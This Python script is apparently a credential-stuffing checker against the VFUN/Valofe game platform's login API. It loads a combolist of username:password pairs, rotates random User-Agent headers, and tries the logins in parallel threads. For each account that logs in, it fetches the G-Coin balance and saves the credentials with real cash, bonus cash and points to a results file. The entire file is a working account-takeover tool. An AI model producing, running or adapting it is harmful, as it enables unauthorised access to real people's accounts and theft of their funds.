import requests
import concurrent.futures
import threading
import random
import time
from colorama import Fore, Style, init

init()

session = requests.Session()
agent_list = []

def initAgents():
    global agent_list
    try:
        with open("agent.txt", "r", encoding="utf-8") as agent_file:
            agent_list = agent_file.read().splitlines()
    except UnicodeDecodeError:
        print("Error: Unable to read 'agent.txt'. Please ensure the file is encoded in UTF-8.")
        return False

    return True

def login(userid, password):
    global session, agent_list
    api_url = 'https://external-api.valofe.com/api/vfun/login'
    payload = {
        'service_code': 'vfun',
        'input_user_id': userid,
        'input_user_password': password,
    }

    headers = {
        'User-Agent': random.choice(agent_list),
        "Content-Type": "application/json",
    }

    try:
        with session.post(api_url, json=payload, headers=headers) as response:
            if response.status_code == 200:
                data = response.json()
                if data['result'] == 1:
                    ssoinfo = data['data']['sso_info_new']
                    userideh = data['data']['user_id']
                    print(f'{Fore.GREEN}[+] Success HIT: {userid} | {ssoinfo} | {userideh}{Style.RESET_ALL}')
                    getBalance(ssoinfo, data['data']['user_id'], {password}, data['data']['birthday'])
                    return True
                else:
                    print(f'{Fore.RED}[-] Failed login to user: {userid}{Style.RESET_ALL}')
    except requests.exceptions.RequestException as e:
        print(f'{Fore.RED}[-] Failed login to user: {userid}{Style.RESET_ALL}')

    return False


def getBalance(ssoinfo, user_id, user_password, birth):
    global session
    apigcoin = 'https://external-api.valofe.com/api/vfun/gcoin/balance/vfun'
    headers = {
        'Ssoinfo': ssoinfo,
        'Userid': user_id,
        'Userbirth': birth,
        'channelingType': 'vfun',
        'User-Agent': random.choice(agent_list),
        "Content-Type": "application/json",
    }

    try:
        with session.get(apigcoin, headers=headers) as responseBalance:
            if responseBalance.status_code == 200:
                dataBalance = responseBalance.json()
                if dataBalance['result'] == 1:
                    realCash = dataBalance['data']['real_cash']
                    bonusCash = dataBalance['data']['bonus_cash']
                    point = dataBalance['data']['point']
                    print(f'{Fore.GREEN}[+] Success to get Cash from: {user_id} | RealCash: {realCash} | BonusCash: {bonusCash} | Point: {point}{Style.RESET_ALL}')
                    with open("results.txt", "a+") as f:
                        f.write(f"\n{user_id}:{user_password} | RCash {realCash} | BCash {bonusCash} | Point {point}")
                else:
                    print(f'{Fore.YELLOW}[-] Failed to get Cash from: {user_id}, but we keep saving the account{Style.RESET_ALL}')
                    with open("results.txt", "a+") as f:
                        f.write(f"\n{user_id}:{user_password} | Failed to get cash from this account.")
            else:
                print(f'{Fore.RED}Failed to get G-Coin balance: {responseBalance.status_code}{Style.RESET_ALL}')
    except requests.exceptions.RequestException as e:
        print(f'{Fore.RED}An error occurred while retrieving G-Coin balance: {e}{Style.RESET_ALL}')

def getCombos(filename):
    global agent_list
    if not initAgents():
        return
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            lines = file.read().splitlines()
    except UnicodeDecodeError:
        print(f"Error: Unable to read '{filename}'. Please ensure the file is encoded in UTF-8.")
        return

    total_lines = len(lines)
    print(f'Total combolist entries in {filename}: {total_lines}')

    success_count = 0
    lock = threading.Lock()

    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(login, credentials[0], credentials[1]) for line in lines if (credentials := line.strip().split(':')) and len(credentials) == 2]

        for future in concurrent.futures.as_completed(futures):
            try:
                success = future.result()
                if success:
                    with lock:
                        success_count += 1
            except Exception as e:
                print(f'An error occurred: {e}')

    print(f'Total successful logins: {success_count}')

combos = "combolist.txt"
getCombos(combos)